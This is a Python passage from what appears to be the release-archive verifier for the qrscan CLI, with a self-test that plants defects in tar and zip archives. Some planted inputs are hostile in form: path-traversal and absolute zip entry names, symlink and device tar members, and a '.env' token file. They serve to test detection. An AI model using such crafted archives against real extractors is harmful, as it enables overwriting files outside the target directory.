def _cli_third_party(version: str, triple: str, deps: list) -> bytes:
    """THIRD-PARTY-LICENSES.txt over DEPS' registry crates: the Apache text for each, the MIT text too when the
    expression names MIT, each text once in the appendix."""
    texts, blocks = {}, []
    for dep in sorted((d for d in deps if d.get("source") is not None),
                      key=lambda d: (str(d["name"]), str(d["version"]))):
        own = [_APACHE_TEXT] + ([_MIT_TEXT] if "MIT" in str(dep["license"]) else [])
        digests = [sha256(text) for text in own]
        texts.update(zip(digests, own))
        blocks.append(f"== {dep['name']} {dep['version']} ==\nlicense: {dep['license']}\nsource: {dep['source']}\n"
                      f"checksum: {dep['checksum']}\ntexts: {' '.join(digests)}\n\n")
    head = f"Third-party crates in qrscan {version} for {triple}, and their license texts\n\n"
    return (head + "".join(blocks)).encode() + b"".join(
        f"--- text {digest} {len(text)} bytes ---\n".encode() + text + b"\n" for digest, text in sorted(texts.items()))


def _cli_source_md(version: str, commit: str, tag, ref: str, run=CLI_FIXTURE_RUN) -> bytes:
    repository = workspace_repository()
    return "\n".join([
        f"# Source of qrscan {version}", "",
        f"- Repository: {repository}",
        f"- Tag: {tag}" if tag else f"- Tag: not a release tag ({ref})",
        f"- Commit: {commit}", f"- Tree: {repository}/tree/{commit}",
        f"- Cargo.lock sha256: {sha256((ROOT / 'Cargo.lock').read_bytes())}",
        f"- Workflow run: {run or 'none (built outside GitHub Actions)'}",
        f"- Corresponding source: {CLI_PACKAGE}-{version}-source.tar.gz (its sha256 is in "
        f"{CLI_PACKAGE}-{version}-SHA256SUMS)",
        "", "Built by .github/workflows/cli-archives.yml and scripts/cli-release.py at that commit.",
        "These files are not code-signed or notarized: see README.md.", ""]).encode()


def cli_self_test():
    """CLI release files: the clean set passes; each planted defect fails with a check naming it."""
    version, failures, count = workspace_version(), [], 0
    commit = subprocess.check_output(["git", "rev-parse", "HEAD^{commit}"], cwd=ROOT, text=True).strip()
    lock, pin, tag = lock_packages(), rust_pin(), f"v{version}"

    def dep(name: str, at: str, expression: str) -> dict:
        package = lock[(name, at)]
        return {"name": name, "version": at, "source": package.get("source"), "checksum": package.get("checksum"),
                "license": expression}

    linked = [dep(name, min(v for n, v in lock if n == name), expression)
              for name, expression in CLI_FIXTURE_LICENSES.items()]
    linked += [dep(name, version, SPDX) for name in ("qrcode-barcode-scanner", CLI_PACKAGE)]
    build_only = next((n, v) for n, v in sorted(lock) if lock[(n, v)].get("source") and n not in CLI_FIXTURE_LICENSES)
    notice = b"<!DOCTYPE html>\n<html><body><p>Rust standard library notice (fixture)</p></body></html>\n"

    def build_info(triple: str, binary: str, program: bytes, std_notice: bytes, release_tag) -> dict:
        gnu, windows = triple.endswith("-linux-gnu"), triple.endswith("-windows-msvc")
        return {
            "schema": CLI_BUILD_INFO, "name": "qrscan", "package": CLI_PACKAGE, "version": version, "target": triple,
            "source": {"repository": workspace_repository(), "tag": release_tag, "commit": commit,
                       "ref": f"refs/tags/{release_tag}" if release_tag else "refs/heads/release-candidate",
                       "source_date_epoch": CLI_FIXTURE_EPOCH, "dirty": False,
                       "cargo_lock_sha256": sha256((ROOT / "Cargo.lock").read_bytes())},
            "toolchain": {"rustc": [f"rustc {pin} (17067e9ac 2026-10-01)", "binary: rustc", f"release: {pin}"],
                          "cargo": f"cargo {pin} (2026-10-01)", "std_notice_sha256": sha256(std_notice)},
            "linker": {"kind": "zig" if gnu else "msvc" if windows else "apple-ld",
                       "unwinder": "zig-libunwind" if gnu else None},
            "profile": cli_profile(),
            "rustflags": [f"--remap-path-prefix={p}=/{p.strip('<>')}" for p in CLI_PLACEHOLDERS]
                         + CLI_ROW_FLAGS.get(triple, []),
            "command": ["cargo", "zigbuild" if gnu else "build", "--release", "--locked", "-p", CLI_PACKAGE, "--bin",
                        "qrscan", "--target", f"{triple}.2.28" if gnu else triple, "--target-dir", "<target-dir>"],
            "deployment_target": CLI_DEPLOYMENT_TARGETS.get(triple),
            "builder": {"runner_os": "Windows" if windows else "Linux" if gnu else "macOS", "runner_arch": "X64",
                        "image_os": "fixture", "image_version": "20261026.1", "workflow_run": CLI_FIXTURE_RUN},
            "binary": {"path": binary, "sha256": sha256(program), "size": len(program)},
            "dependencies": [dict(d) for d in linked],
            "build_dependencies": [dep(*build_only, "MIT OR Apache-2.0")],
        }

    def inner(triple: str, edit=None, release_tag=tag, std_notice: bytes = notice, source_md=None) -> dict:
        """A clean archive's members below its top directory; EDIT(build-info) runs before the files that
        restate it are written."""
        binary = "qrscan.exe" if triple.endswith("-windows-msvc") else "qrscan"
        program = b"\x7fELF qrscan fixture for " + triple.encode()
        info = build_info(triple, binary, program, std_notice, release_tag)
        if edit is not None:
            edit(info)
        files = {member: (ROOT / source).read_bytes() for member, source in CLI_COPIES.items()}
        deps = info.get("dependencies")
        if not isinstance(deps, list) or not all(isinstance(d, dict) and DEPENDENCY_KEYS <= set(d) for d in deps):
            deps = linked  # a malformed inventory: the license file keeps the clean one
        return files | {
            "COPYRIGHT-rust-std.html": std_notice, binary: program,
            "SOURCE.md": source_md if source_md is not None else _cli_source_md(
                version, commit, release_tag, info["source"]["ref"]),
            "THIRD-PARTY-LICENSES.txt": _cli_third_party(version, triple, deps),
            "build-info.json": json.dumps(info, indent=2).encode() + b"\n"}

    def stem(triple: str) -> str:
        return f"{CLI_PACKAGE}-{version}-{triple}"

    def archive_bytes(triple: str, files: dict) -> bytes:
        binary = "qrscan.exe" if triple.endswith("-windows-msvc") else "qrscan"
        if CLI_TARGETS.get(triple) == "zip":
            return _cli_zip(stem(triple), files, binary)
        return _gzip(_ustar(_cli_rows(stem(triple), files, binary)))

    def judge(name: str, paths: list, want: str, *needles: str, options=(), at: str = None) -> Host:
        nonlocal count
        count += 1
        argv = ["archive", *map(str, paths), "--commit", at or commit, *options]
        host = Host(build_parser().parse_args(argv))
        try:
            with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                cmd_archive(host)
        finally:
            shutil.rmtree(host.scratch, ignore_errors=True)
        statuses = {a.status for a in host.artifacts}
        got = FAIL if FAIL in statuses else UNAVAILABLE if UNAVAILABLE in statuses else PASS
        failed = " · ".join(f"{c.name}: {c.detail}" for a in host.artifacts for c in a.checks if not c.ok)
        missing = [n for n in needles if n not in failed]
        contradicted = [c.name for a in host.artifacts for c in a.checks if c.ok and c.detail.startswith("differ")]
        if got != want or missing or contradicted or not host.artifacts:
            failures.append(f"CLI {name}: {got.upper()} (want {want.upper()})"
                            + (f", no failing check names {missing}" if missing else "")
                            + (f", passing checks report a difference: {contradicted}" if contradicted else "")
                            + (f" — failing: {failed[:600]}" if failed else ""))
        return host

    with tempfile.TemporaryDirectory(prefix="cli-inspect-selftest-") as tmp:
        base, saved = pathlib.Path(tmp), CLI_COPIES["README.md"]
        readme = base / "README.md"  # distribution/cli/README.md may not exist yet: a fixture stands in
        readme.write_bytes(b"# qrscan\n\nVerify the archive against SHA256SUMS, extract it and run qrscan.\n")
        CLI_COPIES["README.md"] = str(readme)

        def put(label: str, filename: str, data: bytes) -> pathlib.Path:
            (base / label).mkdir(parents=True, exist_ok=True)
            (base / label / filename).write_bytes(data)
            return base / label / filename

        def sums(label: str, paths: list) -> pathlib.Path:
            lines = "".join(f"{sha256(p.read_bytes())}  {p.name}\n" for p in sorted(paths, key=lambda p: p.name))
            return put(label, f"{CLI_PACKAGE}-{version}-SHA256SUMS", lines.encode())

        def slug(text: str) -> str:
            return re.sub(r"[^a-z0-9]+", "-", text.lower()).strip("-")[:60]

        try:
            archives = {triple: put("set", f"{stem(triple)}.{ext}", archive_bytes(triple, inner(triple)))
                        for triple, ext in CLI_TARGETS.items()}
            git_tar = subprocess.run(["git", "-c", "core.autocrlf=false", "-c", "core.eol=lf", "archive",
                                      "--format=tar", f"--prefix={CLI_PACKAGE}-{version}-source/", commit],
                                     cwd=ROOT, capture_output=True, check=True).stdout
            source = put("set", f"{CLI_PACKAGE}-{version}-source.tar.gz", _gzip(git_tar))
            release = [*archives.values(), source]
            checksums = sums("set", release)
            full, tree = [*release, checksums], ("--source-tree", str(ROOT))
            qualified = sha256(checksums.read_bytes())
            host = judge("clean release set", full, PASS, options=(
                "--release-set", "--tag", tag, "--sums-sha256", qualified, *tree))
            # Not a vacuous pass: every class of check ran on every file of the set.
            wanted = {"cli": ("name is", "zip for the Windows target", "file set is exactly the release archive's",
                              "members in bytewise order", "LICENSE is the AGPL text", "LICENSING.md is",
                              "COPYRIGHT-rust-std.html sha256", "build-info.json: schema", "build-info binary",
                              "build-info dependencies", "build-info links the anchors", "modes by policy",
                              "SOURCE.md states", "lists exactly build-info's linked registry crates",
                              "deny.toml", "no text member holds", "no private or stray files",
                              "does not start with the retired", "README.md names no previous name",
                              "README.md states no availability"),
                      "cli-source": ("pax global header", "file set is exactly the commit's tree",
                                     "each file's bytes = its git blob", "exec bit", "HEAD^{commit} = --commit"),
                      "cli-sums": ("sha256sum's text format", "one line per CLI archive", "--sums-sha256"),
                      "cli-set": ("archives, the source archive and SHA256SUMS once each",)}
            kinds = sorted(a.kind for a in host.artifacts)
            if kinds != ["cli"] * 5 + ["cli-set", "cli-source", "cli-sums"]:
                failures.append(f"CLI clean release set: artifacts {kinds}")
            for art in host.artifacts:
                names = " · ".join(c.name for c in art.checks)
                absent = [needle for needle in wanted.get(art.kind, ()) if needle not in names]
                if absent:
                    failures.append(f"CLI clean release set: {art.name} ran no check {absent}")
            gnu, win, mac = "x86_64-unknown-linux-gnu", "x86_64-pc-windows-msvc", "aarch64-apple-darwin"
            judge("one archive and a SHA256SUMS listing it alone",
                  [archives[gnu], sums("partial", [archives[gnu]])], PASS)
            judge("the Windows archive alone", [archives[win]], PASS, options=("--tag", f"refs/tags/{tag}"))
            judge("a branch build: no tag anywhere", [put("branch", f"{stem(mac)}.tar.gz", archive_bytes(
                mac, inner(mac, release_tag=None)))], PASS)

            def unattended(info):
                info["builder"]["workflow_run"] = None

            judge("a build outside GitHub Actions", [put("local", f"{stem(mac)}.tar.gz", archive_bytes(mac, inner(
                mac, unattended, source_md=_cli_source_md(version, commit, tag, f"refs/tags/{tag}", None))))], PASS)
            judge("the source archive alone", [source], PASS, options=tree)

            # C1: the name.
            clean_gnu = archives[gnu].read_bytes()
            for label, filename, needle in (
                    ("an archive named at another version", f"{CLI_PACKAGE}-0.10.0-{gnu}.tar.gz", "version 0.10.0"),
                    ("an archive for a triple outside the five", f"{CLI_PACKAGE}-{version}-x86_64-unknown-linux-musl"
                                                                 ".tar.gz", "target is one of"),
                    ("a Linux archive as .zip", f"{stem(gnu)}.zip", "zip for the Windows target"),
                    ("an archive name without a target", f"{CLI_PACKAGE}-{version}.tar.gz", "name is"),
                    ("an archive under the 0.10 crate name", f"{CLI_RETIRED}-{version}-{gnu}.tar.gz",
                     f"does not start with the retired {CLI_RETIRED}-")):
                judge(label, [put(slug(label), filename, clean_gnu)], FAIL, needle)
            judge("a source archive under the 0.10 crate name",
                  [put("retired-source", f"{CLI_RETIRED}-{version}-source.tar.gz", source.read_bytes())], FAIL,
                  f"does not start with the retired {CLI_RETIRED}-", options=tree)
            retired_sums = put("retired-sums", f"{CLI_RETIRED}-{version}-SHA256SUMS",
                               sums("retired-sums-lines", [archives[gnu]]).read_bytes())
            judge("a SHA256SUMS under the 0.10 crate name", [archives[gnu], retired_sums], FAIL,
                  f"does not start with the retired {CLI_RETIRED}-")
            # The archive README: never another name (the CLI archives never had
            # one) and no availability text. The fixture README changes, so the
            # copy check agrees and only the README rules fail.
            clean_readme = readme.read_bytes()
            for label, text, needle in (
                    ("a README saying not yet published", b"# qrscan\n\nNot yet published on crates.io.\n",
                     "README.md states no availability"),
                    ("a README naming a previous name",
                     f"# qrscan\n\nReleases up to 0.10.1 were published as `{CLI_RETIRED}`.\n".encode(),
                     "README.md names no previous name")):
                readme.write_bytes(text)
                try:
                    judge(label, [put(slug(label), f"{stem(gnu)}.tar.gz", archive_bytes(gnu, inner(gnu)))], FAIL,
                          needle)
                finally:
                    readme.write_bytes(clean_readme)
            judge("the Windows archive as .tar.gz", [put("win-tgz", f"{stem(win)}.tar.gz", _gzip(_ustar(_cli_rows(
                stem(win), inner(win), "qrscan.exe"))))], FAIL, "zip for the Windows target")

            # C2: one gzip member over one plain ustar stream, as the writer makes it.
            gnu_files = inner(gnu)

            def rows() -> list:
                return _cli_rows(stem(gnu), gnu_files, "qrscan")

            def tar_case(label: str, data: bytes, *needles: str) -> None:
                judge(label, [put(f"tar-{slug(label)}", f"{stem(gnu)}.tar.gz", data)], FAIL, *needles)

            plain = _ustar(rows())
            for label, header, needle in (
                    ("a file name", b"\x1f\x8b\x08\x08\0\0\0\0\x02\xffqrscan.tar\0", "FNAME"),
                    ("a modification time", b"\x1f\x8b\x08\x00" + CLI_FIXTURE_EPOCH.to_bytes(4, "little") + b"\x02\xff",
                     "gzip mtime 1793597346"),
                    ("zlib's Unix OS byte", GZIP_HEADER[:9] + b"\x03", "OS byte 3"),
                    ("a comment", b"\x1f\x8b\x08\x10\0\0\0\0\x02\xffnote\0", "flags 0x10"),
                    ("a header CRC", b"\x1f\x8b\x08\x02\0\0\0\0\x02\xff" + (zlib.crc32(
                        b"\x1f\x8b\x08\x02\0\0\0\0\x02\xff") & 0xFFFF).to_bytes(2, "little"), "flags 0x02")):
                tar_case(f"gzip header with {label}", _gzip(plain, header=header), needle)
            tar_case("a second gzip member", _gzip(plain) + _gzip(b"more"), "byte(s) after the gzip member")
            tar_case("a cut gzip stream", _gzip(plain)[:-64], "cut short")
            tar_case("an uncompressed tar", plain, "not a gzip")
            for kind, needle in ((tarfile.SYMTYPE, "symlink"), (tarfile.LNKTYPE, "hard link"),
                                 (tarfile.FIFOTYPE, "FIFO"), (tarfile.CHRTYPE, "character device")):
                link = tarfile.TarInfo(f"{stem(gnu)}/zz-{needle.replace(' ', '-')}")
                link.type, link.linkname, link.mtime = kind, "qrscan", CLI_FIXTURE_EPOCH
                tar_case(f"a {needle} member", _gzip(_ustar(rows() + [(link, b"")])), f"({needle})")
            tar_case("a pax global header", _gzip(_ustar(rows(), pax_global={"comment": commit})),
                     "a pax global header (comment)")
            extended = rows()
            extended[2][0].pax_headers = {"comment": "x"}
            tar_case("a pax header before a member", _gzip(_ustar(extended, tarfile.PAX_FORMAT)),
                     "an extended (pax or GNU) header before it")
            tar_case("GNU tar headers", _gzip(_ustar(rows(), tarfile.GNU_FORMAT)), "not POSIX ustar")
            old = rows()
            old[3][0].type = tarfile.AREGTYPE
            tar_case("an old-style regular file header (type NUL)", _gzip(_ustar(old)), "header type b'\\x00'")
            tar_case("bytes after the end-of-archive blocks", _gzip(plain + b"trailing"), "non-NUL byte(s) after")
            hidden = rows()
            tar_case("a member after an all-zero block", _gzip(_tar_blocks(hidden[:-1]) + b"\0" * 512 + _tar_blocks(
                hidden[-1:]) + b"\0" * 1024), "only a lenient parse lists")
            twice = rows()
            tar_case("a member twice", _gzip(_ustar(twice + [twice[2]])), "duplicate member name")

            # C2: one clean zip stream.
            win_files, win_top = inner(win), stem(win)
            clean_zip = archives[win].read_bytes()
            readme_entry = f"{win_top}/README.md"

            def zip_case(label: str, data: bytes, *needles: str) -> None:
                judge(label, [put(f"zip-{slug(label)}", f"{win_top}.zip", data)], FAIL, *needles)

            def entry(name: str, **fields):
                return lambda member, info: [setattr(info, k, v) for k, v in fields.items()] if member == name else None

            for label, name, needle in (("a duplicate entry", f"{win_top}/LICENSE", "a duplicate entry"),
                                        ("an absolute entry", "/abs.txt", "an absolute name"),
                                        ("a drive-letter entry", "C:/abs.txt", "an absolute name"),
                                        ("a `..` entry", f"{win_top}/../up.txt", "a `..` component"),
                                        ("a backslash entry", f"{win_top}\\x.txt", "a backslash")):
                zip_case(label, _cli_zip(win_top, win_files, "qrscan.exe", extra=[(name, b"x")]), needle)
            zip_case("a symlink entry", _cli_zip(win_top, win_files, "qrscan.exe", entry(
                "README.md", external_attr=0o120777 << 16)), "a symlink")
            zip_case("an extra field", _cli_zip(win_top, win_files, "qrscan.exe", entry(
                "README.md", extra=b"\x99\x99\x04\x00abcd")), "an extra field")
            zip_case("an entry comment", _cli_zip(win_top, win_files, "qrscan.exe", entry(
                "README.md", comment=b"note")), "an entry comment")
            zip_case("an archive comment", _cli_zip(win_top, win_files, "qrscan.exe", comment=b"note"),
                     "an archive comment")
            zip_case("an encrypted entry", _zip_patch(clean_zip, readme_entry, flags=0x1), "encrypted")
            zip_case("an entry with a data descriptor", _zip_patch(clean_zip, readme_entry, flags=0x8),
                     "a data descriptor")
            zip_case("a bzip2 entry", _zip_patch(clean_zip, readme_entry, method=12), "compression 12")
            zip_case("bytes before the first entry", b"JUNK" * 4 + clean_zip, "+16 byte(s) before its local header")
            zip_case("bytes after the end record", clean_zip + b"trailing",
                     "data after the end-of-central-directory record")
            zip_case("no zip at all", b"not a zip\n" * 4, "reads as one .zip archive")

            # C3: one top directory named like the archive, exactly the members, bytewise order.
            for label, files, needle in (
                    ("an extra member", gnu_files | {"extra.txt": b"x\n"}, f"unexpected: {stem(gnu)}/extra.txt"),
                    ("a missing member", {k: v for k, v in gnu_files.items() if k != "LICENSE-APACHE-2.0"},
                     f"missing: {stem(gnu)}/LICENSE-APACHE-2.0"),
                    ("a .env member", gnu_files | {".env": b"TOKEN=x\n"}, "no private or stray files: .env")):
                tar_case(label, _gzip(_ustar(_cli_rows(stem(gnu), files, "qrscan"))), needle)
            tar_case("no directory entry", _gzip(_ustar(rows()[1:])), f"missing: {stem(gnu)}/")
            tar_case("another top directory", _gzip(_ustar(_cli_rows("qrscan-0.11.0", gnu_files, "qrscan"))),
                     f"one top directory, {stem(gnu)}/")
            swapped = rows()
            swapped[1], swapped[2] = swapped[2], swapped[1]
            tar_case("members out of bytewise order", _gzip(_ustar(swapped)),
                     f"{stem(gnu)}/LICENSE before {stem(gnu)}/COPYRIGHT-rust-std.html")

            # C4: owners, times and modes by policy, never from a filesystem.
            for label, index, field, value, needle in (
                    ("a member owned by uid 1001", 2, "uid", 1001, "uid/gid 1001/0"),
                    ("a member with a user name", 2, "uname", "runner", "uname 'runner'"),
                    ("a member with a group name", 2, "gname", "docker", "gname 'docker'"),
                    ("a member with another mtime", 2, "mtime", CLI_FIXTURE_EPOCH + 1, "mtime 1793597347"),
                    ("qrscan without its exec bits", -1, "mode", 0o644, "qrscan: mode 644, want 755"),
                    ("a text member with exec bits", 2, "mode", 0o755, "LICENSE: mode 755, want 644"),
                    ("a directory mode 0700", 0, "mode", 0o700, "mode 700, want 755")):
                planted = rows()
                setattr(planted[index][0], field, value)
                tar_case(label, _gzip(_ustar(planted)), needle)
            for label, edit, needle in (
                    ("a zip entry made on another system", entry("LICENSE", create_system=0), "create_system 0"),
                    ("a zip entry at another time", entry("LICENSE", date_time=(2020, 1, 1, 0, 0, 0)),
                     "time (2020, 1, 1, 0, 0, 0)"),
                    ("qrscan.exe without its exec bits", entry("qrscan.exe", external_attr=0o100644 << 16),
                     "qrscan.exe: mode 100644, want 100755")):
                zip_case(label, _cli_zip(win_top, win_files, "qrscan.exe", edit), needle)

            def member_case(label: str, files: dict, *needles: str, triple: str = gnu, options=()) -> None:
                path = put(f"member-{slug(label)}", f"{stem(triple)}.{CLI_TARGETS[triple]}",
                           archive_bytes(triple, files))
                judge(label, [path], FAIL, *needles, options=options)

            # C5: the copies are their checkout files, the std notice the one build-info hashed.
            member_case("LICENSE with CRLF line ends", gnu_files | {"LICENSE": LICENSE.read_bytes().replace(
                b"\n", b"\r\n")}, "LICENSE is the AGPL text")
            for member, source_path in CLI_COPIES.items():
                if member != "LICENSE":
                    member_case(f"an altered {member}", gnu_files | {member: gnu_files[member] + b"\nedited\n"},
                                f"{member} is {rel(ROOT / source_path)} verbatim: differs")
            member_case("a std notice other than build-info's", gnu_files | {"COPYRIGHT-rust-std.html": b"<html/>\n"},
                        "COPYRIGHT-rust-std.html sha256 = build-info toolchain.std_notice_sha256")
            CLI_COPIES["README.md"] = str(base / "absent" / "README.md")
            member_case("the README source absent from the checkout", gnu_files, "absent from the checkout")
            CLI_COPIES["README.md"] = str(readme)

            # C6: SOURCE.md states each fact once, with the value this run knows.
            facts = _cli_source_md(version, commit, tag, f"refs/tags/{tag}")
            for label, text, needle in (
                    ("another commit", _cli_source_md(version, "0" * 40, tag, f"refs/tags/{tag}"), "Commit:"),
                    ("no source archive line", re.sub(rb"- Corresponding source:[^\n]*\n", b"", facts),
                     "Corresponding source: no line"),
                    ("a second tag line", facts + b"- Tag: v0.0.1\n", "Tag: ['- Tag: v0.11.0', '- Tag: v0.0.1']"),
                    ("no tag on a tagged build", _cli_source_md(version, commit, None, f"refs/tags/{tag}"), "Tag:"),
                    ("another workflow run", _cli_source_md(version, commit, tag, f"refs/tags/{tag}",
                                                            "https://example.invalid/run/1"), "Workflow run:"),
                    ("CRLF line ends", facts.replace(b"\n", b"\r\n"), "LF line ends"),
                    ("a non-UTF-8 byte", facts + b"\xff\n", "UTF-8"),
                    ("a home path", facts + b"Built in /home/alice/src.\n", "SOURCE.md: '/home/'")):
                member_case(f"SOURCE.md with {label}", gnu_files | {"SOURCE.md": text}, needle)

            # C7: build-info holds exactly its keys, and every fact this run can check.
            def info_case(label: str, edit, *needles: str, triple: str = gnu) -> None:
                member_case(f"build-info with {label}", inner(triple, edit), *needles, triple=triple,
                            options=("--tag", tag))

            def setter(*keys, value=None, drop: bool = False):
                def edit(info):
                    node = info
                    for key in keys[:-1]:
                        node = node[key]
                    if drop:
                        del node[keys[-1]]
                    else:
                        node[keys[-1]] = value
                return edit

            member_case("build-info that is no JSON", gnu_files | {"build-info.json": b"{"},
                        "build-info.json reads as a JSON object")
            member_case("build-info that is a JSON list", gnu_files | {"build-info.json": b"[]\n"},
                        "build-info.json reads as a JSON object: list")
            for label, edit, needle in (
                    ("another schema", setter("schema", value="qrscan-build-info/2"), "schema 'qrscan-build-info/2'"),
                    ("an extra key", setter("signed", value=True), "unexpected key signed"),
                    ("a missing nested key", setter("builder", "image_version", drop=True),
                     "missing key builder.image_version"),
                    ("a linker without its unwinder", setter("linker", "unwinder", drop=True),
                     "linker is no object with kind and unwinder"),
                    ("a dependency with an extra key", setter("dependencies", 0, "path", value="/x"),
                     "dependencies[0] keys"),
                    ("rustflags as one string", setter("rustflags", value="-Copt-level=3"),
                     "rustflags is no list of strings"),
                    ("another binary name", setter("name", value="qrscan2"), "name 'qrscan2'"),
                    ("another target", setter("target", value="aarch64-unknown-linux-gnu"), "target 'aarch64"),
                    ("another version", setter("version", value="0.10.0"), "version '0.10.0'"),
                    ("another commit", setter("source", "commit", value="0" * 40), "build-info source.commit"),
                    ("a tag other than --tag", setter("source", "tag", value="v0.10.0"), "source.tag 'v0.10.0'"),
                    ("a tag without its ref", setter("source", "ref", value="refs/heads/main"),
                     "ref 'refs/heads/main'"),
                    ("a dirty tree", setter("source", "dirty", value=True), "dirty: True"),
                    ("another Cargo.lock", setter("source", "cargo_lock_sha256", value="0" * 64), "Cargo.lock sha256"),
                    ("another repository", setter("source", "repository", value="https://github.com/fork/scanner"),
                     "repository: 'https://github.com/fork/scanner'"),
                    ("a string source_date_epoch", setter("source", "source_date_epoch", value="1793597346"),
                     "source_date_epoch: '1793597346'"),
                    ("another rustc", setter("toolchain", "rustc", value=["release: 1.98.1"]),
                     "release lines ['1.98.1']"),
                    ("another binary sha256", setter("binary", "sha256", value="0" * 64), "build-info binary"),
                    ("another binary size", setter("binary", "size", value=1), "size 1"),
                    ("fat LTO", setter("profile", "lto", value="fat"), "build-info profile"),
                    ("rxing without overflow checks", setter("profile", "overflow_checks", value={}),
                     "build-info profile"),
                    ("a host path remap", setter("rustflags", 0, value="--remap-path-prefix=/home/runner/.cargo=/c"),
                     "build-info rustflags"),
                    ("no row flag", lambda info: info["rustflags"].pop(), "build-info rustflags"),
                    ("an extra flag", lambda info: info["rustflags"].append("-Ctarget-cpu=native"),
                     "build-info rustflags"),
                    ("no unwinder on a GNU row", setter("linker", "unwinder", value=None), "unwinder None"),
                    ("a deployment target on Linux", setter("deployment_target", value="10.15"),
                     "deployment_target = null"),
                    ("another dependency checksum", setter("dependencies", 0, "checksum", value="0" * 64),
                     "checksum '" + "0" * 64),
                    ("a dependency outside Cargo.lock", lambda info: info["dependencies"].append(
                        dict(info["dependencies"][0], version="0.0.0")), "is not in Cargo.lock"),
                    ("a dependency twice", lambda info: info["dependencies"].append(dict(info["dependencies"][0])),
                     "listed twice"),
                    ("a dependency without a license", setter("dependencies", 0, "license", value=""),
                     "has no license expression"),
                    ("a dependency name that is a list", setter("dependencies", 0, "name", value=["clap"]),
                     "a name or version that is no string"),
                    ("an anchor missing", lambda info: info.update(dependencies=[
                        d for d in info["dependencies"] if d["name"] != "rxing"]), "missing: rxing"),
                    ("a build dependency outside Cargo.lock", setter("build_dependencies", 0, "version", value="0.0.0"),
                     "build_dependencies: ")):
                info_case(label, edit, needle)
            info_case("a macOS deployment target of 12.0", setter("deployment_target", value="12.0"),
                      'deployment_target = "11.0"', triple=mac)

            # C8: the license file restates build-info's linked registry crates, with texts that hash to their names.
            third = gnu_files["THIRD-PARTY-LICENSES.txt"]
            head, _, rest = third.partition(b"\n\n")
            blocks_part, _, appendix = rest.partition(b"--- text ")
            blocks = [block + b"\n\n" for block in blocks_part.split(b"\n\n") if block]
            appendix = b"--- text " + appendix
            texts = [b"--- text " + text for text in appendix.split(b"--- text ") if text]
            registry = sorted((d for d in linked if d["source"] is not None), key=lambda d: (d["name"], d["version"]))
            first, second = (f"{d['name']} {d['version']}" for d in registry[:2])

            def third_case(label: str, data: bytes, *needles: str) -> None:
                member_case(f"THIRD-PARTY-LICENSES.txt with {label}", gnu_files | {"THIRD-PARTY-LICENSES.txt": data},
                            *needles)

            mit, apache = sha256(_MIT_TEXT), sha256(_APACHE_TEXT)
            for label, data, needle in (
                    ("another target in its header", third.replace(gnu.encode(), mac.encode(), 1),
                     f"header names qrscan {version} for {gnu}"),
                    ("a crate missing", _cli_third_party(version, gnu, registry[1:]),
                     f"not listed: {registry[0]['name']}"),
                    ("a build-only crate", _cli_third_party(version, gnu, [*registry, dep(*build_only, "MIT")]),
                     f"not a linked registry crate in build-info: {build_only[0]}"),
                    ("crates out of order", head + b"\n\n" + b"".join([blocks[1], blocks[0], *blocks[2:]]) + appendix,
                     f"{second} before {first}"),
                    ("another license", third.replace(b"license: Apache-2.0\n", b"license: MIT\n", 1),
                     "license 'MIT', build-info 'Apache-2.0'"),
                    ("another source", third.replace(b"source: registry+", b"source: git+", 1), "source 'git+"),
                    ("another checksum", re.sub(rb"checksum: [0-9a-f]{64}", b"checksum: " + b"0" * 64, third, count=1),
                     "checksum '" + "0" * 64),
                    ("a text it names but does not hold", head + b"\n\n" + b"".join(blocks) + b"".join(
                        t for t in texts if mit.encode() not in t), "which the file does not hold"),
                    ("a text that does not hash to its name", third.replace(b"Permission is hereby granted",
                                                                             b"Permission is hereby GRANTED"),
                     f"text {mit[:16]}… hashes to"),
                    ("a text no crate names", third + f"--- text {sha256(b'x')} 1 bytes ---\nx\n".encode(),
                     "is named by no crate"),
                    ("texts out of order", head + b"\n\n" + b"".join(blocks) + b"".join(reversed(texts)),
                     "texts not sorted by sha256"),
                    ("a crate block without its checksum", re.sub(rb"checksum: [0-9a-f]{64}\n", b"", third, count=1),
                     "a malformed crate block"),
                    ("a text cut short", third[:-40], "is cut short"),
                    ("no empty line after its header", third.replace(b"\n\n", b"\n", 1),
                     "no empty line after the header")):
                third_case(label, data, needle)
            for label, expression in (("GPL-3.0-only", "GPL-3.0-only"), ("MIT-0", "MIT-0"),
                                      ("MIT AND GPL-3.0-only", "MIT AND GPL-3.0-only"),
                                      ("an unbalanced expression", "(MIT OR Apache-2.0")):
                info_case(f"a dependency licensed {label}", setter("dependencies", 0, "license", value=expression),
                          "satisfiable from deny.toml's allow list")
            # The expression evaluator alone: deny.toml's list, every SPDX form cargo-deny reads.
            allowed = deny_allowed()
            for expression, want in (("MIT", True), ("MIT/Apache-2.0", True), ("Apache-2.0 WITH LLVM-exception", True),
                                     ("(MIT OR Apache-2.0) AND Unicode-3.0", True), ("mit or Apache-2.0", True),
                                     ("GPL-2.0-only WITH Classpath-exception-2.0 OR MIT", True),
                                     ("MIT AND GPL-3.0-only", False), ("GPL-3.0-only", False),
                                     ("Apache-2.0 WITH Classpath-exception-2.0", False), ("MIT-0", False),
                                     ("MIT OR", None), ("(MIT", None), ("MIT Apache-2.0", None), ("WITH MIT", None)):
                count += 1
                try:
                    got = spdx_allowed(expression, allowed)
                except ValueError:
                    got = None
                if got is not want:
                    failures.append(f"CLI spdx {expression!r}: {got} (want {want})")

            # C9: no text member names a build host, generically or by this host's own paths, nor a --forbid value.
            marker = "acme-private-marker"
            for label, plant, needle, env, options in (
                    ("plans/ in a text member", "see plans/notes.md", "COPYRIGHT-rust-std.html: 'plans/'", {}, ()),
                    ("a --forbid value", f"built for {marker}", "COPYRIGHT-rust-std.html: --forbid value 2", {},
                     ("--forbid", "never-present", "--forbid", marker.upper())),
                    ("the RUNNER_TEMP path", "/srv/ci-temp/run-7/out", "COPYRIGHT-rust-std.html: RUNNER_TEMP",
                     {"RUNNER_TEMP": "/srv/ci-temp/run-7"}, ()),
                    ("the checkout path in Windows form", str(ROOT).replace("/", "\\"), "the checkout path", {}, ()),
                    ("an upper-case Windows user path", "C:\\USERS\\RUNNERADMIN\\x", "'runneradmin'", {}, ()),
                    ("a macOS runner home", "/Users/runner/work", "'/Users/runner'", {}, ())):
                saved_env = {key: os.environ.get(key) for key in env}
                os.environ.update(env)
                try:
                    planted = archive_bytes(gnu, inner(gnu, std_notice=notice + plant.encode() + b"\n"))
